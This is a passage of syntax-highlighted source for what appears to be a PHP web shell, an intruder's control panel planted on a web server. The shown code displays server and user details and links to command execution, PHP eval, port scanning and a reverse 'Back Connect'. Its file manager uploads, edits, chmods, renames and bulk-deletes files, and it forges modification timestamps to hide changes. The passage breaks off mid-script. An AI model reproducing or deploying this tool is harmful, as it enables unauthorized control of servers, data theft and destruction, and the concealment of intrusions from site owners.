<span style="color: #969896; background-color: #1d1f21;"> </span>  <span style="color: #b5bd68;"> if</span> (action == 'del') {<span style="color: #de935f; background-color: #373b41;">      </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>  <span style="color: #b5bd68;"> if</span> (!<span style="color: #de935f;">confirm</span>('Is or isn\'t deletion record?'))<span style="color: #b5bd68;"> return</span>;
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   $('recordlist').doing.value=action;
<span style="color: #969896; background-color: #1d1f21;"> </span>   $('recordlist').base64.value=base64;
<span style="color: #969896; background-color: #1d1f21;"> </span>   $('recordlist').tablename.value=tablename;
<span style="color: #969896; background-color: #1d1f21;"> </span>   $('recordlist').<span style="color: #de935f;">submit</span>();
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">moddbname</span>(dbname) {
<span style="color: #969896; background-color: #1d1f21;"> </span>  <span style="color: #b5bd68;"> if</span>(!dbname)<span style="color: #b5bd68;"> return</span>;
<span style="color: #969896; background-color: #1d1f21;"> </span>   $('setdbname').dbname.value=dbname;
<span style="color: #969896; background-color: #1d1f21;"> </span>   $('setdbname').<span style="color: #de935f;">submit</span>();
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">settable</span>(tablename,doing,page) {
<span style="color: #969896; background-color: #1d1f21;"> </span>  <span style="color: #b5bd68;"> if</span>(!tablename)<span style="color: #b5bd68;"> return</span>;
<span style="color: #969896; background-color: #1d1f21;"> </span>  <span style="color: #b5bd68;"> if</span> (doing) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $('settable').doing.value=doing;
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>  <span style="color: #b5bd68;"> if</span> (page) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $('settable').page.value=page;
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   $('settable').tablename.value=tablename;
<span style="color: #969896; background-color: #1d1f21;"> </span>   $('settable').<span style="color: #de935f;">submit</span>();
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">s</span>(action,nowpath,p1,p2,p3,p4,p5) {
<span style="color: #969896; background-color: #1d1f21;"> </span>  <span style="color: #b5bd68;"> if</span>(action) $('opform').action.value=action;
<span style="color: #969896; background-color: #1d1f21;"> </span>  <span style="color: #b5bd68;"> if</span>(nowpath) $('opform').nowpath.value=nowpath;
<span style="color: #969896; background-color: #1d1f21;"> </span>  <span style="color: #b5bd68;"> if</span>(p1) $('opform').p1.value=p1;
<span style="color: #969896; background-color: #1d1f21;"> </span>  <span style="color: #b5bd68;"> if</span>(p2) $('opform').p2.value=p2;
<span style="color: #969896; background-color: #1d1f21;"> </span>  <span style="color: #b5bd68;"> if</span>(p3) $('opform').p3.value=p3;
<span style="color: #969896; background-color: #1d1f21;"> </span>  <span style="color: #b5bd68;"> if</span>(p4) $('opform').p4.value=p4;
<span style="color: #969896; background-color: #1d1f21;"> </span>  <span style="color: #b5bd68;"> if</span>(p5) $('opform').p4.value=p5;
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">g</span>(action,nowpath,p1,p2,p3,p4,p5) {
<span style="color: #969896; background-color: #1d1f21;"> </span>  <span style="color: #b5bd68;"> if</span>(!action)<span style="color: #b5bd68;"> return</span>;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #de935f;">s</span>(action,nowpath,p1,p2,p3,p4,p5);
<span style="color: #969896; background-color: #1d1f21;"> </span>   $('opform').<span style="color: #de935f;">submit</span>();
}
&lt;/script&gt;
&lt;/head&gt;
&lt;body style="margin:0;table-layout:fixed; word-break:break-all"&gt;
&lt;?php
formhead(array('name'=&gt;'opform'));
makehide('action', $action);
makehide('nowpath', $nowpath);
makehide('p1', $p1);
makehide('p2', $p2);
makehide('p3', $p3);
makehide('p4', $p4);
makehide('p5', $p5);
formfoot();

if(!function_exists('posix_getegid')) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   $user = @get_current_user();
<span style="color: #969896; background-color: #1d1f21;"> </span>   $uid = @getmyuid();
<span style="color: #969896; background-color: #1d1f21;"> </span>   $gid = @getmygid();
<span style="color: #969896; background-color: #1d1f21;"> </span>   $group = "?";
} else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   $uid = @posix_getpwuid(@posix_geteuid());
<span style="color: #969896; background-color: #1d1f21;"> </span>   $gid = @posix_getgrgid(@posix_getegid());
<span style="color: #969896; background-color: #1d1f21;"> </span>   $user = $uid['name'];
<span style="color: #969896; background-color: #1d1f21;"> </span>   $uid = $uid['uid'];
<span style="color: #969896; background-color: #1d1f21;"> </span>   $group = $gid['name'];
<span style="color: #969896; background-color: #1d1f21;"> </span>   $gid = $gid['gid'];
}

?&gt;
&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;
<span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;tr class="head"&gt;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;td&gt;&lt;span style="float:right;"&gt;&lt;?php echo @php_uname();?&gt; / User:&lt;?php e<span style="text-decoration: underline;">cho $uid.' ( '.$user.' ) / Group: '.$gid.' ( '.$group.' )';?&gt;&lt;/span&gt;&lt;?php echo $_SERVER['HTTP_HOST'];?&gt; (&lt;?php echo gethostbyname($_SERVER['SERVER_NAME']);?&gt;)&lt;/td&gt;</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;/tr&gt;
<span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;tr class="alt1"&gt;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;td&gt;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;span style="float:right;"&gt;PHP &lt;?php echo PHP_VERSION;?&gt; / Safe Mode<span style="text-decoration: underline;">:&lt;?php echo getcfg('safe_mode');?&gt;&lt;/span&gt;</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;a href="javascript:g('logout');"&gt;Logout&lt;/a&gt; |<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;a href="javascript:g('file');"&gt;File Manager&lt;/a&gt; |<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;a href="javascript:g('mysqladmin');"&gt;MYSQL Manager&lt;/a&gt; |<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;a href="javascript:g('sqlfile');"&gt;MySQL Upload &amp;amp; Download&lt;/a&gt; |<span style="color: #de935f; background-color: #373b41; text-decoration: underline;"> </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;a href="javascript:g('shell');"&gt;Execute Command&lt;/a&gt; |<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;a href="javascript:g('phpenv');"&gt;PHP Variable&lt;/a&gt; |<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;a href="javascript:g('portscan');"&gt;Port Scan&lt;/a&gt; |<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;a href="javascript:g('secinfo');"&gt;Security information&lt;/a&gt; |<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;a href="javascript:g('eval');"&gt;Eval PHP Code&lt;/a&gt;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;?php if (!IS_WIN) {?&gt; | &lt;a href="javascript:g('backconnect');"&gt;Back<span style="text-decoration: underline;"> Connect&lt;/a&gt;&lt;?php }?&gt;</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;/td&gt;
<span style="color: #969896; background-color: #1d1f21;"> </span>   &lt;/tr&gt;
&lt;/table&gt;
&lt;table width="100%" border="0" cellpadding="15" cellspacing="0"&gt;&lt;tr&gt;&lt;td&gt;
&lt;?php
$errmsg &amp;&amp; m($errmsg);

// &#33719;&#21462;&#24403;&#21069;&#36335;&#24452;
if (!$dir) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   $dir = $_SERVER["DOCUMENT_ROOT"] ? $_SERVER["DOCUMENT_ROOT"] : '.';
}
$nowpath = getPath(SA_ROOT, $dir);
if (substr($dir, -1) != '/') {
<span style="color: #969896; background-color: #1d1f21;"> </span>   $dir = $dir.'/';
}

if ($action == 'file') {

<span style="color: #969896; background-color: #1d1f21;"> </span>   // &#21028;&#26029;&#35835;&#20889;&#24773;&#20917;
<span style="color: #969896; background-color: #1d1f21;"> </span>   $dir_writeable = @is_writable($nowpath) ? 'Writable' : 'Non-writable';

<span style="color: #969896; background-color: #1d1f21;"> </span>   // &#21019;&#24314;&#30446;&#24405;
<span style="color: #969896; background-color: #1d1f21;"> </span>   if ($newdirname) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $mkdirs = $nowpath.$newdirname;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if (file_exists($mkdirs)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   m('Directory has already existed');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   m('Directory created '.(@mkdir($mkdirs,0777) ? 'success' : 'failed')<span style="text-decoration: underline;">);</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   @chmod($mkdirs,0777);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   }

<span style="color: #969896; background-color: #1d1f21;"> </span>   // &#19978;&#20256;&#25991;&#20214;
<span style="color: #969896; background-color: #1d1f21;"> </span>   elseif ($doupfile) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   m('File upload '.(@copy($_FILES['uploadfile']['tmp_name'],$uploaddir.'/'<span style="text-decoration: underline;">.$_FILES['uploadfile']['name']) ? 'success' : 'failed'));</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   }

<span style="color: #969896; background-color: #1d1f21;"> </span>   // &#32534;&#36753;&#25991;&#20214;
<span style="color: #969896; background-color: #1d1f21;"> </span>   elseif ($editfilename &amp;&amp; $filecontent) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $fp = @fopen($editfilename,'w');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   m('Save file '.(@fwrite($fp,$filecontent) ? 'success' : 'failed'));
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   @fclose($fp);
<span style="color: #969896; background-color: #1d1f21;"> </span>   }

<span style="color: #969896; background-color: #1d1f21;"> </span>   // &#32534;&#36753;&#25991;&#20214;&#23646;&#24615;
<span style="color: #969896; background-color: #1d1f21;"> </span>   elseif ($pfile &amp;&amp; $newperm) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if (!file_exists($pfile)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   m('The original file does not exist');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $newperm = base_convert($newperm,8,10);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   m('Modify file attributes '.(@chmod($pfile,$newperm) ? 'success' : '<span style="text-decoration: underline;">failed'));</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   }

<span style="color: #969896; background-color: #1d1f21;"> </span>   // &#25913;&#21517;
<span style="color: #969896; background-color: #1d1f21;"> </span>   elseif ($oldname &amp;&amp; $newfilename) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $nname = $nowpath.$newfilename;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if (file_exists($nname) || !file_exists($oldname)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   m($nname.' has already existed or original file does not exist');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   m(basename($oldname).' renamed '.basename($nname).(@rename($oldname,<span style="text-decoration: underline;">$nname) ? ' success' : 'failed'));</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   }

<span style="color: #969896; background-color: #1d1f21;"> </span>   // &#22797;&#21046;&#25991;&#20214;
<span style="color: #969896; background-color: #1d1f21;"> </span>   elseif ($sname &amp;&amp; $tofile) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if (file_exists($tofile) || !file_exists($sname)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   m('The goal file has already existed or original file does not exist<span style="text-decoration: underline;">');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   m(basename($tofile).' copied '.(@copy($sname,$tofile) ? basename($to<span style="text-decoration: underline;">file).' success' : 'failed'));</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   }

<span style="color: #969896; background-color: #1d1f21;"> </span>   // &#20811;&#38534;&#26102;&#38388;
<span style="color: #969896; background-color: #1d1f21;"> </span>   elseif ($curfile &amp;&amp; $tarfile) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if (!@file_exists($curfile) || !@file_exists($tarfile)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   m('The goal file has already existed or original file does not exist<span style="text-decoration: underline;">');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $time = @filemtime($tarfile);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   m('Modify file the last modified '.(@touch($curfile,$time,$time) ? '<span style="text-decoration: underline;">success' : 'failed'));</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   }

<span style="color: #969896; background-color: #1d1f21;"> </span>   // &#33258;&#23450;&#20041;&#26102;&#38388;
<span style="color: #969896; background-color: #1d1f21;"> </span>   elseif ($curfile &amp;&amp; $year &amp;&amp; $month &amp;&amp; $day &amp;&amp; $hour &amp;&amp; $minute &amp;&amp; $second) <span style="text-decoration: underline;">{</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if (!@file_exists($curfile)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   m(basename($curfile).' does not exist');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $time = strtotime("$year-$month-$day $hour:$minute:$second");
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   m('Modify file the last modified '.(@touch($curfile,$time,$time) ? '<span style="text-decoration: underline;">success' : 'failed'));</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   }

<span style="color: #969896; background-color: #1d1f21;"> </span>   // &#25209;&#37327;&#21024;&#38500;&#25991;&#20214;
<span style="color: #969896; background-color: #1d1f21;"> </span>   elseif($doing == 'delfiles') {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($dl) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $dfiles='';
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $succ = $fail = 0;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   foreach ($dl as $filepath) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if (is_dir($filepath)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if (@deltree($filepath)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $succ++;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $fail++;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if (@unlink($filepath)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $succ++;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $fail++;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   m('Deleted folder/file have finished,choose '.count($dl).' success '<span style="text-decoration: underline;">.$succ.' fail '.$fail);</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   m('Please select folder/file(s)');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   }

<span style="color: #969896; background-color: #1d1f21;"> </span>   //&#25805;&#20316;&#23436;&#27605;
<span style="color: #969896; background-color: #1d1f21;"> </span>   formhead(array('name'=&gt;'createdir'));
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('newdirname');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('dir',$nowpath);
<span style="color: #969896; background-color: #1d1f21;"> </span>   formfoot();
<span style="color: #969896; background-color: #1d1f21;"> </span>   formhead(array('name'=&gt;'fileperm'));
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('newperm');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('pfile');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('dir',$nowpath);
<span style="color: #969896; background-color: #1d1f21;"> </span>   formfoot();
<span style="color: #969896; background-color: #1d1f21;"> </span>   formhead(array('name'=&gt;'copyfile'));
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('sname');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('tofile');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('dir',$nowpath);
<span style="color: #969896; background-color: #1d1f21;"> </span>   formfoot();
<span style="color: #969896; background-color: #1d1f21;"> </span>   formhead(array('name'=&gt;'rename'));
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('oldname');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('newfilename');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('dir',$nowpath);
<span style="color: #969896; background-color: #1d1f21;"> </span>   formfoot();
<span style="color: #969896; background-color: #1d1f21;"> </span>   formhead(array('name'=&gt;'fileopform', 'target'=&gt;'_blank'));
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('action');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('opfile');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('dir');
<span style="color: #969896; background-color: #1d1f21;"> </span>   formfoot();
<span style="color: #969896; background-color: #1d1f21;"> </span>   formhead(array('name'=&gt;'getsize'));
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('getdir');
<span style="color: #969896; background-color: #1d1f21;"> </span>   makehide('dir');
<span style="color: #969896; background-color: #1d1f21;"> </span>   formfoot();

<span style="color: #969896; background-color: #1d1f21;"> </span>   $free = @disk_free_space($nowpath);
<span style="color: #969896; background-color: #1d1f21;"> </span>   !$free &amp;&amp; $free = 0;
<span style="color: #969896; background-color: #1d1f21;"> </span>   $all = @disk_total_space($nowpath);
<span style="color: #969896; background-color: #1d1f21;"> </span>   !$all &amp;&amp; $all = 0;
<span style="color: #969896; background-color: #1d1f21;"> </span>   $used = $all-$free;
<span style="color: #969896; background-color: #1d1f21;"> </span>   p('&lt;h2&gt;File Manager - Current disk free '.sizecount($free).' of '.sizecount(<span style="text-decoration: underline;">$all).' ('.@round(100/($all/$free),2).'%)&lt;/h2&gt;');</span>

<span style="color: #969896; background-color: #1d1f21;"> </span>   $cwd_links = '';
<span style="color: #969896; background-color: #1d1f21;"> </span>   $path = explode('/', $nowpath);
<span style="color: #969896; background-color: #1d1f21;"> </span>   $n=count($path);
<span style="color: #969896; background-color: #1d1f21;"> </span>   for($i=0;$i&lt;$n-1;$i++) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $cwd_links .= '&lt;a href="javascript:godir(\'';
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   for($j=0;$j&lt;=$i;$j++) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $cwd_links .= $path[$j].'/';
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $cwd_links .= '\');"&gt;'.$path[$i].'/&lt;/a&gt;';
<span style="color: #969896; background-color: #1d1f21;"> </span>   }

?&gt;
&lt;script type="text/javascript"&gt;
document.onclick = shownav;
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">shownav</span>(e){
<span style="color: #969896; background-color: #1d1f21;"> </span>  <span style="color: #b5bd68;"> var</span> <span style="color: #f0c674;">src</span> = e?e.<span style="color: #f0c674;">target</span>:event.srcElement;
<span style="color: #969896; background-color: #1d1f21;"> </span>  <span style="color: #b5bd68;"> do</span>{
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>  <span style="color: #b5bd68;"> if</span>(src.id =="jumpto") {
